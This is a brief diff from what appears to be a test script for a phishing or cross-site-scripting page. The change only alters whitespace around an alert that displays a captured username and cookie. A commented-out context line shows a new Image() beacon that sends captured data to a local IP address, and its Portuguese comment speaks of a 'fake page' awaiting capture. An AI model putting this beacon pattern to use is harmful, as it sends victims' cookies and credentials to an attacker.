@@ -19,7 +19,8 @@ var array = {
 
 //new Image().src = "http://192.168.0.123/?=" + str2 +"_Recebeu_a_pagina_falsa_aguarde_captura....";
 
-alert(array.usuario + ' / ' + array.cookie);
+alert(array.usuario + ' / ' + array.cookie);  
+
 
 
 // Para Testes
